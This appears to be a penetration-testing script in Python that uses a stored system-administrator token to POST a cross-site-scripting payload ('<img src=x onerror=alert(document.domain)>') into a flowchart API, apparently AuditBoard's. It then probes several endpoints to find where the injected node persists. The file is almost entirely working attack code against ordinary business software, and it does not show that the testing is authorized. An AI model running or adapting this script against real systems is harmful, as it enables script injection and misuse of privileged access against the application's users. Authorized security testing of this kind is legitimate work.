import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
def req(m,p,body=None):
    cmd=['curl','-s','-m','60','-o','/tmp/b','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXR'+uuid.uuid4().hex[:5]
pay=f'<img src=x onerror=alert(document.domain)>{tag}'
print("=== does the flowchart node persist anywhere queryable? ===")
node={"id":"1","description":pay,"nextStep":[],"connectorLabel":[],
      "shapeType":"Process","function":"","phase":"","altText":""}
c,b=req('POST','/api/v1/documents/flowchart',[node])
print(f"  POST flowchart -> {c}")
if c=='200':
    url=json.loads(b).get('url','')
    print(f"  url key: {url.split('/flowchart/')[1].split('?')[0] if '/flowchart/' in url else url[:80]}")
print()
print("=== is there a flowchart record endpoint? ===")
for p in ['/api/v1/flowcharts','/api/v1/documents/flowchart','/api/v1/narratives/38/flowchart']:
    c,b=req('GET',p)
    print(f"  {c} {p}  {b[:130].replace(chr(10),' ')}")
print()
print("=== narrative 38: does it hold a flowchart ref? ===")
c,b=req('GET','/api/v1/narratives/38')
try:
    o=json.loads(b)['narratives'][0]
    for k in o:
        if 'flow' in k.lower() or 'chart' in k.lower():
            print(f"  {k} = {str(o[k])[:120]}")
except: pass
